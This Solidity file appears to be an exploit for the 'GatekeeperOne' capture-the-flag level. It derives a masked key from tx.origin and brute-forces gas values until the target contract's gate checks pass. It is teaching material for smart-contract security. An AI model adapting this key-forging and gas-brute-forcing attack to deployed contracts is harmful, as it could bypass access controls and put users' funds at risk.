// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract GatekeeperOneAttack {
    GatekeeperOne g;
    bytes8 key;

    constructor(address target) {
        g = GatekeeperOne(target);
        key = bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);
    }

    function attack() public {
        for (uint i = 0; i < 8191; i++) {
            try g.enter{gas: 80000 + i}(key) {
                console.log("passed with gas:", 80000 + i);
                break;
             } catch {}
        }
    }

    function callEnter(uint _gas) public {
        g.enter{gas: _gas}(key);
    }
}